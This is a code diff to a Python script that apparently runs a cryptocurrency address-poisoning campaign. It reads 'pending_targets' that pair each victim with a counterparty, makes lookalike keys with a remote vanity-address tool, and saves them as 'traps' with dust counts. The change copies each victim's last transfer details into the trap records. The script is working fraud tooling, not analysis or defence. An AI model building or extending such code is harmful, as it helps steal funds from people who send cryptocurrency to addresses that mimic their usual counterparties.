@@ -223,7 +223,7 @@ def fetch_pending_pairs():
         
         while True:
             result = supabase.table('pending_targets')\
-                .select('id, counterparty, victim')\
+                .select('id, counterparty, victim, last_transfer_date, last_transfer_amount, last_transfer_asset, last_transfer_block')\
                 .eq('chain', CHAIN)\
                 .eq('processed', False)\
                 .order('id')\
@@ -241,7 +241,20 @@ def fetch_pending_pairs():
                 
             start += page_size
 
-        return [(row['id'], row['counterparty'].lower(), row['victim'].lower()) for row in all_rows]
+        return [
+            (
+                row['id'],
+                row['counterparty'].lower(),
+                row['victim'].lower(),
+                {
+                    'last_transfer_date': row.get('last_transfer_date'),
+                    'last_transfer_amount': row.get('last_transfer_amount'),
+                    'last_transfer_asset': row.get('last_transfer_asset'),
+                    'last_transfer_block': row.get('last_transfer_block'),
+                }
+            )
+            for row in all_rows
+        ]
     except Exception as e:
         logger.error(f"Failed to fetch pending pairs: {e}")
         return []
@@ -348,7 +361,7 @@ def kill_remote_profanity():
         logger.warning(f"Failed to kill remote profanity: {e}")
 
 # --- Save trap (database only) ---
-def save_trap(counterparty, victim, private_key, campaign_id, batch_id=None):
+def save_trap(counterparty, victim, private_key, campaign_id, batch_id=None, transfer_data=None):
     if not private_key:
         return
     if not supabase or not Web3:
@@ -369,6 +382,12 @@ def save_trap(counterparty, victim, private_key, campaign_id, batch_id=None):
             "generation_batch_id": batch_id,
             "dust_count": 0,
         }
+        # 🆕 Merge transfer data from pending_target if available
+        if transfer_data:
+            for key, value in transfer_data.items():
+                if value is not None:
+                    data[key] = value
+            logger.debug(f"Copied transfer data from pending_target: {transfer_data}")
         supabase.table("traps").insert(data).execute()
         logger.info(f"Inserted trap {trap_address} for campaign {campaign_id} (batch: {batch_id[:8]}...)")
     except Exception as e:
@@ -473,7 +492,8 @@ def main():
     # 2. Fetch pending pairs from database
     pending_pairs = fetch_pending_pairs()
     # Filter out already processed (counterparty, victim) pairs
-    pending = [(pid, cp, v) for pid, cp, v in pending_pairs if (cp, v) not in processed]
+    
+    pending = [(pid, cp, v, td) for pid, cp, v, td in pending_pairs if (cp, v) not in processed]
 
     if not pending:
         logger.info("No pending pairs to process.")
@@ -507,8 +527,8 @@ def main():
     # ─── NEW: Success counter for cleanup ───
     success_counter = 0
 
-    # FIX: Changed enumerate to start from 1 (not start_index+1)
-    for idx, (pair_id, cp, victim) in enumerate(pending, start=1):
+        # FIX: Changed enumerate to start from 1 (not start_index+1)
+    for idx, (pair_id, cp, victim, transfer_data) in enumerate(pending, start=1):
         # ─── Check cancellation ───
         if job_id and is_job_cancelled(job_id):
             logger.info("Job cancelled by user. Exiting.")
@@ -534,7 +554,7 @@ def main():
         try:
             key = generate_key_for_counterparty(cp)
             if key:
-                save_trap(cp, victim, key, campaign_id, batch_id)
+                save_trap(cp, victim, key, campaign_id, batch_id, transfer_data)
                 success_count += 1
                 success_counter += 1
                 # write_progress no longer used for resume, but kept for compatibility
